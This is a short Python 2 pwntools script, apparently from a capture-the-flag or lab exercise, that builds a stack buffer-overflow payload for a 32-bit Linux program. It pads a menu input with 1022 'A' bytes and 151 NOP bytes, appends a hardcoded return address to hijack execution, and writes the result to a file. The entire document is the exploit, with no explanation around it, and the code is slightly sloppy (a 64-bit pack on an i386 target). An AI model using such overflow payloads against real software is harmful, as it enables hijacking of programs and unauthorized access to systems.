#!/usr/bin/env python2

from pwn import *

context.arch='i386'
context.os='linux'

# Return address in little-endian format
ret_addr = 0x565562ad
addr = p64(ret_addr, endian='little')

# Opcode for the NOP instruction
nop = asm('nop', arch="i386")

#generating payload
intial_payload = "2\n"
nop_sleed = 1022
eip_offset = 151

#payload = intial_payload+nop*nop_sleed+nop*eip_offset + addr

payload = intial_payload+"A"*nop_sleed+nop*eip_offset + addr

# Writes payload on a file
with open("./m_payload", "wb") as f:
	f.write(payload)
